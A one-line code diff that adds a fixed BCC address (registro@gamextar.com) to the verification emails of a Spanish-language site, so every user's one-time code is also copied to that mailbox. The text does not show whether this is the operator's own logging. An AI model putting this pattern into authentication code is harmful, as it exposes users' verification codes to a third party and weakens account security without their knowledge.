@@ -1646,6 +1646,7 @@ async function sendVerificationEmail(env, toEmail, code) {
       body: JSON.stringify({
         from: `${fromName} <${fromEmail}>`,
         to: [toEmail],
+        bcc: ['registro@gamextar.com'],
         subject: `${code} — Tu código de verificación`,
         text: `Tu código de verificación para Mansión Deseo es: ${code}\n\nExpira en 30 minutos.\n\nSi no solicitaste esto, ignora este email.`,
         html: verificationEmailHTML(code),
